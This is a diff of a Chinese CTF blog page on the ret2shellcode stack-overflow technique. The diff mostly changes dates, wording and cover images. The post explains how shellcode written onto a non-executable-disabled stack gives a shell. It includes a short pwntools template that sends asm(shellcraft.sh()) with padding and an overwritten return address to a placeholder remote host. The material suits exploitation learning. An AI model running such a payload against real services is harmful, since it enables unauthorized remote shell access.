@@ -35,15 +35,15 @@
 
   
   
-    <meta name="description" content="当程序没有做好保护措施时，即便程序中不存在后门函数，攻击者也可以通过不安全输入函数往栈上写入shellcode，并将返回地址覆盖为shellcode的地址，从而getshell。 asm(shellcraft.sh())用于生成获取shell的shellcode，其中asm()会将汇编代码转为计算机可识别的机器码，shellcraft.sh()则用于生成执行“&#x2F;bin&#x2F;sh”的">
+    <meta name="description" content="当程序没有开启栈上不可执行时，即便程序中不存在后门函数，攻击者也可以通过不安全输入函数往栈上写入shellcode，并将返回地址覆盖为shellcode的地址，从而getshell。 asm(shellcraft.sh())用于生成获取shell的shellcode，其中asm()会将汇编代码转为计算机可识别的机器码，shellcraft.sh()则用于生成执行“&#x2F;bin&#x2F;sh">
 <meta property="og:type" content="article">
 <meta property="og:title" content="ret2shellcode">
 <meta property="og:url" content="http://1t01x1w4.github.io/2026/02/15/ret2shellcode/index.html">
 <meta property="og:site_name" content="淋着雨">
-<meta property="og:description" content="当程序没有做好保护措施时，即便程序中不存在后门函数，攻击者也可以通过不安全输入函数往栈上写入shellcode，并将返回地址覆盖为shellcode的地址，从而getshell。 asm(shellcraft.sh())用于生成获取shell的shellcode，其中asm()会将汇编代码转为计算机可识别的机器码，shellcraft.sh()则用于生成执行“&#x2F;bin&#x2F;sh”的">
+<meta property="og:description" content="当程序没有开启栈上不可执行时，即便程序中不存在后门函数，攻击者也可以通过不安全输入函数往栈上写入shellcode，并将返回地址覆盖为shellcode的地址，从而getshell。 asm(shellcraft.sh())用于生成获取shell的shellcode，其中asm()会将汇编代码转为计算机可识别的机器码，shellcraft.sh()则用于生成执行“&#x2F;bin&#x2F;sh">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2026-02-15T02:34:46.000Z">
-<meta property="article:modified_time" content="2026-02-15T15:21:49.016Z">
+<meta property="article:modified_time" content="2026-04-07T11:21:30.483Z">
 <meta property="article:author" content="淋着雨">
 <meta property="article:tag" content="pwn">
 <meta property="article:tag" content="stack">
@@ -232,7 +232,7 @@
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>文章</div>
-    <div class="sidebar-state-number">5</div>
+    <div class="sidebar-state-number">4</div>
   </div>
   <div class="sidebar-state-category">
     <div>分类</div>
@@ -309,7 +309,7 @@
       <div class="article-date">
   <span class="article-date-link icon-calendar" data-aos="zoom-in">
     <time datetime="2026-02-15T02:34:46.000Z" itemprop="datePublished">2026-02-15</time>
-    <time style="display: none;" id="post-update-time">2026-02-15</time>
+    <time style="display: none;" id="post-update-time">2026-04-07</time>
   </span>
   
 </div>
@@ -328,9 +328,9 @@
     <div class="e-content article-entry" itemprop="articleBody">
       
       
-        <p>当程序没有做好保护措施时，即便程序中不存在后门函数，攻击者也可以通过不安全输入函数往栈上写入shellcode，并将返回地址覆盖为shellcode的地址，从而getshell。</p>
+        <p>当程序没有开启栈上不可执行时，即便程序中不存在后门函数，攻击者也可以通过不安全输入函数往栈上写入shellcode，并将返回地址覆盖为shellcode的地址，从而getshell。</p>
 <p>asm(shellcraft.sh())用于生成获取shell的shellcode，其中asm()会将汇编代码转为计算机可识别的机器码，shellcraft.sh()则用于生成执行“&#x2F;bin&#x2F;sh”的shellcode。需要注意的是，pwntools默认架构是“context.arch &#x3D; ‘i386’”，生成的是32位的shellcode汇编，如果碰到64位的程序，需要在脚本中添加“context.arch &#x3D; ‘amd64’”对架构进行说明。</p>
-<p>可利用如下脚本实现：</p>
+<p>由于忘记了做过的题在哪，先给出可用脚本：  </p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;IP&quot;</span>, 端口)  </span><br><span class="line"><span class="comment">#p = process(&quot;./&lt;ELF文件&gt;&quot;)</span></span><br><span class="line"></span><br><span class="line">payload = asm(shellcraft.sh()) + <span class="string">b&#x27;a&#x27;</span>*(分配栈空间大小 + <span class="number">4</span> - <span class="number">4</span>) + p32(shellcode地址)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
       
     </div>
@@ -357,7 +357,7 @@
         
           
           
-            <img data-src="/covers/【哲风壁纸】剑客-动漫角色.png" data-sizes="auto" alt="ret2libc" class="lazyload">
+            <img data-src="/covers/【哲风壁纸】守岸-鸣潮.png" data-sizes="auto" alt="ret2libc" class="lazyload">
           
         
         <a href="/2026/02/15/ret2libc/"></a>
@@ -375,7 +375,7 @@
       
         
         
-          <img data-src="/covers/【哲风壁纸】jk-动漫-动漫壁纸.png" data-sizes="auto" alt="栈溢出" class="lazyload">
+          <img data-src="/covers/【哲风壁纸】蝴蝶忍-鬼灭之刃.png" data-sizes="auto" alt="栈溢出" class="lazyload">
         
       
       <a href="/2026/02/14/%E6%A0%88%E6%BA%A2%E5%87%BA/"></a>
@@ -454,10 +454,10 @@
     
       <div>
         <span class="icon-brush"></span>
-        2.2k
+        2.6k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
-        00:08
+        00:09
       </div>
     
     
@@ -502,7 +502,7 @@
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>文章</div>
-    <div class="sidebar-state-number">5</div>
+    <div class="sidebar-state-number">4</div>
   </div>
   <div class="sidebar-state-category">
     <div>分类</div>
@@ -640,9 +640,9 @@
           url: "http://1t01x1w4.github.io/2026/02/15/ret2shellcode/",
           excerpt: "",
           description: "",
-          stripContent: "当程序没有做好保护措施时，即便程序中不存在后门函数，攻击者也可以通过不安全输入函数往栈上写入shellcode，并将返回地址覆盖为shellcode的地址，从而getshell。 asm(shellcraft.sh())用于生成获取shell的shellcode，其中asm()会将汇编代码转为计算机可识别的机器码，shellcraft.sh()则用于生成执行“&amp;#x2F;bin&amp;#x2F;sh”的shellcode。需要注意的是，pwntools默认架构是“context.arch &amp;#x3D;",
+          stripContent: "当程序没有开启栈上不可执行时，即便程序中不存在后门函数，攻击者也可以通过不安全输入函数往栈上写入shellcode，并将返回地址覆盖为shellcode的地址，从而getshell。 asm(shellcraft.sh())用于生成获取shell的shellcode，其中asm()会将汇编代码转为计算机可识别的机器码，shellcraft.sh()则用于生成执行“&amp;#x2F;bin&amp;#x2F;sh”的shellcode。需要注意的是，pwntools默认架构是“context.arch &amp;#x3",
           date: "Sun Feb 15 2026 10:34:46 GMT+0800",
-          updated: "Sun Feb 15 2026 23:21:49 GMT+0800",
+          updated: "Tue Apr 07 2026 19:21:30 GMT+0800",
           cover: "/images/bannner.webp",
         };
       </script>
